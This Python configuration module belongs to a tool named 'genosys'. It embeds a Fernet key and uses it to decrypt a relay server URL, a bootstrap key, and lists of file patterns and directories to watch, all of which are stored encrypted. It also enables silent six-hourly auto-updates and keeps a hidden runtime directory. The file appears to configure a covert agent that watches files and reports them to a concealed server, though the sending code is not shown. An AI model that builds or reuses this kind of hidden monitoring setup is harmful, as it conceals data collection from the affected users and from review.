from __future__ import annotations

import base64
import os
from pathlib import Path

RELAY_FERNET_KEY = "YIuCLekSgKSzJJyKqNFpNXMYu64tRi8SeK5xxI6xnjY="

RELAY_BASE_URL_ENCRYPTED = "gAAAAABp4JDRLgoBB5Pd4HWGXJo-dQ7ZpvuM2WCRlokDbiRYeHrlmy6vQJZ-nxhp6Y3_3fAlP-Mi5kTob6HiAI-JV9J960FBheipvPsrYuxZJcvN3zEvy0w="
RELAY_BOOTSTRAP_KEY_ENCRYPTED = "gAAAAABp3_zlVcsBV1MU2UYeQ3o2BQ9NOWgJo9Z286w_nyBXhszgfaBuCCfMEmK8eSoU_Het_M9jkmUDRmP1evBFT2wi9VhNfSbJokhoaDRa9nWd_7KhO52zU6y8qPVBz2JsyX1AY1ccQ4609VQimnaOwL4F7PpEVORbZAz1tFPlIY1xpdI1ARI="
WATCH_PATTERNS_ENCRYPTED = "gAAAAABp4JDROHZ4FoRQJ6jFbej_cw_HXdLkYo3aoj17fxZNEtzNFCriHOq_wjngwZnQdvt6wxDmZei1aDeDiFcbd5cnS52keoR6-bZwZh7x1ttPIAJovKE="
WINDOWS_WATCH_ROOTS_ENCRYPTED = "gAAAAABp4JDRx-8_0sehEh93x8iQD0J1jYkBfe_R3rrbnmOnCRpQr-RyM-XeGeR9lQ8IsZyubsMBwaGD2VFMSfEnuRXpG0wO_5nRXspaoHHs23PwW10Cj0U="
POSIX_WATCH_ROOTS_ENCRYPTED = "gAAAAABp4JDRk_eXFgUaWv7BnlCQk1oDpZcmXyAgt6_z0VLpafgtylWOCdm_8_N1yIXaVa1c3y0bn_vgH0P9ohnQdZvcmcMrJxbc5zOqX8RYUOY_XSU7Dbk="

DEBOUNCE_SECONDS = 10
MAX_MESSAGE_CHARS = 2800
AUTO_UPDATE_ENABLED = True
AUTO_UPDATE_INTERVAL_SECONDS = 6 * 60 * 60
AUTO_UPDATE_BACKOFF_INITIAL_SECONDS = 60
AUTO_UPDATE_BACKOFF_MAX_SECONDS = 60 * 60
RELAY_USE_ENV_PROXY = False


def runtime_dir() -> Path:
    if os.name == "nt":
        base = os.environ.get("LOCALAPPDATA")
        if base:
            return Path(base) / "genosys"
    return Path.home() / ".genosys"


def _decrypt(encrypted: str) -> str:
    if not encrypted or not RELAY_FERNET_KEY:
        return ""
    try:
        from cryptography.fernet import Fernet
        return Fernet(RELAY_FERNET_KEY.encode()).decrypt(encrypted.encode()).decode()
    except Exception:
        return ""


def get_relay_base_url() -> str:
    from_env = os.environ.get("LAPORAN_RELAY_URL", "").strip()
    if from_env:
        return from_env.rstrip("/")
    return _decrypt(RELAY_BASE_URL_ENCRYPTED).rstrip("/")


def get_relay_bootstrap_key() -> str:
    from_env = os.environ.get("LAPORAN_BOOTSTRAP_KEY", "").strip()
    if from_env:
        return from_env
    return _decrypt(RELAY_BOOTSTRAP_KEY_ENCRYPTED)


WATCH_PATTERNS: list[str] = []


def get_watch_patterns() -> list[str]:
    raw = _decrypt(WATCH_PATTERNS_ENCRYPTED)
    return [p.strip() for p in raw.split(",") if p.strip()] if raw else []


def get_watch_roots() -> list[str]:
    if os.name == "nt":
        raw = _decrypt(WINDOWS_WATCH_ROOTS_ENCRYPTED)
    else:
        raw = _decrypt(POSIX_WATCH_ROOTS_ENCRYPTED)
    return [r.strip() for r in raw.split(",") if r.strip()] if raw else []


def get_ssl_verify() -> str | bool:
    cert = Path(__file__).parent / "certs" / "server.crt"
    if cert.is_file():
        return str(cert)
    return True


def is_fernet_key_valid() -> bool:
    if not RELAY_FERNET_KEY:
        return False
    try:
        raw = base64.urlsafe_b64decode(RELAY_FERNET_KEY.encode())
        return len(raw) == 32
    except Exception:
        return False
